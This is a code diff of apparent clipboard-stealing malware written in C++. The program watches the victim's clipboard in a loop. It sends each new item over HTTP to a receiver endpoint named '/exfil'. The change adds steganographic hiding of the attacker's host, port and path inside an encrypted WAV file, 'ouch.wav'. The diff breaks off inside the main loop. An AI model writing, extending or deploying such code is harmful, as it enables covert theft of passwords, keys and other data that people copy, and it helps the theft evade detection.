@@ -6,42 +6,40 @@
 #include <clipboard.h>
 #include <tools.h>
 #include <httpexfil.h>
+#include <wavcrypt.h>
 
 // Console ouput UTF_16 format, TODO REMOVE
 #include <fcntl.h>
 #include <io.h>
 
-void HandleNewData(std::wstring& data)
-{
-    std::string utf8_data = WStringToUtf8(data);
-    
-    std::wcout << L"[*] New Clipboard Content:\n\n" << data << L"\n\n";
-    std::wcout << L"Sending data to receiver...\n";
+void HandleNewData(std::string& data)
+{    
+    std::cout << "[*] New Clipboard Content:\n\n" << data << "\n\n";
+    std::cout << "Sending data to receiver...\n";
 
     try
     {
-        ExfiltrateClipboardHTTP(utf8_data, "127.0.0.1", "/exfil", 80);
+        ExfiltrateClipboardHTTP(data, "127.0.0.1", "/exfil", 80);
     }
     catch(const std::exception& ex)
     {
-        std::wcout << L"Error when sending data to receiver: " << ex.what() << "\n";
+        std::wcout << "Error when sending data to receiver: " << ex.what() << "\n";
     }
     catch(...)
     {
-        std::wcout << L"Unknown exception occured when sending data to receiver.\n";
+        std::wcout << "Unknown exception occured when sending data to receiver.\n";
     }
 }
 
 int main() {
-    // Console ouput UTF_16 format, TODO REMOVE
-    _setmode(_fileno(stdout), _O_U16TEXT);
+    std::cout << "[*] Clipboard Interceptor Started\n";
+    std::string lastClipboard = "";
 
-    std::wcout << L"[*] Clipboard Interceptor Started\n";
-    std::wstring lastClipboard = L"";
+    auto [host, port, path] = ExtractAndDecryptConfig("ouch.wav");
 
     while(true)
     {
-        std::wstring currentClipboard = GetClipboardText();
+        std::string currentClipboard = GetClipboardText();
 
         if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
         {
